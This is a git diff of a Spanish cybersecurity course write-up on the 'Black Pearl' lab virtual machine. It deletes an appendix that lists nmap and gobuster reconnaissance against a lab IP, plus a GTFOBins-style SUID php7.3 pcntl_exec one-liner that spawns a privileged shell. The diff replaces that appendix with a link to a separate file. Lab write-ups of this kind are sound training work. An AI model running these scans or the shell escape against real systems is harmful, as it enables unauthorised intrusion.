@@ -1,4 +1,3 @@
-# BlackPearl-Writeup.md
 # TRABAJO FINAL CIBERSEGURIDAD
 
 
@@ -9,6 +8,7 @@
 * Máquina Virtual elegida: Black Pearl
 * Fecha de análisis: 06/11/2025
 * Equipo/entorno utilizado: KALI LINUX
+
 
 ## Descripción del Caso
 
@@ -53,32 +53,6 @@ El equipo de ciberseguridad recomienda tomar las siguientes acciones para manten
 
 ---
 
-## ANEXOS
+## 🔎 Ver el Paso a Paso Detallado (Anexos)
 
-Máquina: Black Pearl
-
-### Comandos utilizados
-
-Para que los comandos se vean bien, se usa un bloque de código:
-
-````bash
-# Escaneo de puertos
-❯ sudo nmap -p- -Pn -n --min-rate 5000 192.168.18.34 
-
-# Enumeración de directorios con IP
-❯ gobuster dir -u [http://192.168.18.34/](http://192.168.18.34/) -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 50 
-
-# Mapeo de dominio (en /etc/hosts)
-sudo nano /etc/hosts 
-
-# Enumeración de directorios con dominio (wordlist medium)
-❯ gobuster dir -u [http://blackpearl.tcm/](http://blackpearl.tcm/) -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt 
-
-# Comando de shell para pcntl_exec
-CMD="/bin/sh" 
-
-# Referencia metodológica GTFOBins (abuso SUID en PHP)
-www-data@blackpearl:/usr/bin$ ./php7.3 -r "pcntl\_exec('/bin/sh', \['-p']);" 
-
-# Recuperar flag
-cat flag.txt
+Puedes encontrar los comandos utilizados, el log del sistema y el detalle del proceso de explotación en el archivo separado: **[Paso-a-Paso.md](./Paso-a-Paso.md)**
